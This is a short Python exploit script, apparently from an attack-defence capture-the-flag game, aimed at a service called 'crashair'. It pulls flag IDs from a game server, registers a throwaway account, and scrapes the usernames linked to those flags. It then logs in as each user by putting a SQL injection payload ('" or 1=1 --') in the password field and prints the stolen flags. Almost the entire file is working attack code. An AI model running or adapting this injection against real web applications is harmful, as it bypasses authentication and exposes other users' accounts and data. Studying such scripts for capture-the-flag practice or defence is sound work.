#!/usr/bin/env python3

import sys
import random
import string
from bs4 import BeautifulSoup as ps

import requests

target = sys.argv[1]


def generate_random_string():
    length = random.randint(5, 15)
    letters = string.ascii_letters + string.digits + string.punctuation
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string


optional_ids = requests.get(f"http://10.10.0.1:8081/flagIds?service=crashair&team={target}").json()["crashair"][target]

s = requests.Session()
username = generate_random_string()
password = generate_random_string()
s.post(f"http://{target}:8000/register", data={"username": username, "password": password})

mainPage = ps(s.get(f"http://{target}:8000/optionals").text, "html.parser")
rows = mainPage.find_all("tr", {"class": ""})

usernames = [row.find_next("td").string for row in rows if row.find_next("th").string in optional_ids]

for username in usernames:
    c = requests.Session()
    password = generate_random_string() + "\" or 1=1  --  "
    c.post(f"http://{target}:8000/login", data={"username": username, "password": password})
    page = ps(c.get(f"http://{target}:8000/optionals").text, "html.parser")
    for td in page.find_all("td"):
        if td.string.endswith("="):
            print(td.string, flush=True)